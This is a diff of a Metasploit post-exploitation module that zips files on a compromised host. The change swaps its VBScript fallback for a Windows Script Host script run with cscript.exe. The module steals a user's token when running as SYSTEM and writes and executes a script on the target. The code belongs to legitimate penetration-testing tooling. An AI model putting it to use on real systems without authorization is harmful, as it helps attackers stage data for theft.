@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Windows::Priv
 
@@ -16,7 +13,7 @@ class MetasploitModule < Msf::Post
         'Description'   => %q{
           This module zips a file or a directory. On Linux, it uses the zip command.
           On Windows, it will try to use remote target's 7Zip if found. If not, it falls
-          back to its own VBScript.
+          back to its Windows Scripting Host.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [ 'sinn3r' ],
@@ -28,7 +25,7 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('DESTINATION', [true, 'The destination path']),
         OptString.new('SOURCE', [true, 'The directory or file to compress'])
-      ], self.class)
+      ])
   end
 
   def get_program_file_path
@@ -39,10 +36,12 @@ class MetasploitModule < Msf::Post
     file?("#{get_program_file_path}\\7-Zip\\7z.exe")
   end
 
-  def vbs(dest, src)
-    vbs_file = File.read(File.join(Msf::Config.data_directory, "post", "zip", "zip.vbs"))
-    vbs_file << "WindowsZip \"#{src}\",\"#{dest}\""
-    vbs_file
+  def wsh_script(dst, src)
+    script_file = File.read(File.join(Msf::Config.data_directory, "post", "zip", "zip.js"))
+    src.gsub!("\\", "\\\\\\")
+    dst.gsub!("\\", "\\\\\\")
+    script_file << "zip(\"#{src}\",\"#{dst}\");".force_encoding("UTF-8")
+    script_file
   end
 
   def find_pid_by_user(username)
@@ -62,7 +61,7 @@ class MetasploitModule < Msf::Post
     pid = find_pid_by_user(current_user)
 
     unless pid
-      fail_with(Failure::Unknown, "Unable to find a PID for #{current_user} to execute .vbs")
+      fail_with(Failure::Unknown, "Unable to find a PID for #{current_user} to execute WSH")
     end
 
     print_status("Stealing token from PID #{pid} for #{current_user}")
@@ -77,21 +76,21 @@ class MetasploitModule < Msf::Post
     @token_stolen = true
   end
 
-  def upload_exec_vbs_zip
+  def upload_exec_wsh_script_zip
     if is_system?
       unless session
-        print_error('Unable to decompress with VBS technique without Meterpreter')
+        print_error('Unable to compress with WSH technique without Meterpreter')
         return
       end
 
       steal_token
     end
 
-    script = vbs(datastore['DESTINATION'], datastore['SOURCE'])
-    tmp_path = "#{get_env('TEMP')}\\zip.vbs"
-    print_status("VBS file uploaded to #{tmp_path}")
-    write_file(tmp_path, script)
-    cmd_exec("wscript.exe #{tmp_path}")
+    script = wsh_script(datastore['DESTINATION'], datastore['SOURCE'])
+    tmp_path = "#{get_env('TEMP')}\\zip.js"
+    print_status("script file uploaded to #{tmp_path}")
+    write_file(tmp_path, script.encode("UTF-16LE"))
+    cmd_exec("cscript.exe #{tmp_path}")
   end
 
   def do_7zip
@@ -110,8 +109,8 @@ class MetasploitModule < Msf::Post
       print_status("Compressing #{datastore['DESTINATION']} via 7zip")
       do_7zip
     else
-      print_status("Compressing #{datastore['DESTINATION']} via VBS")
-      upload_exec_vbs_zip
+      print_status("Compressing #{datastore['DESTINATION']} via WSH")
+      upload_exec_wsh_script_zip
     end
   end
 
@@ -132,14 +131,11 @@ class MetasploitModule < Msf::Post
   def run
     @token_stolen = false
 
-    os = get_target_os
-    case os
-    when Msf::Module::Platform::Windows.realname.downcase
+    if session.platform == 'windows'
       windows_zip
     else
       linux_zip
     end
   end
-
 end
 
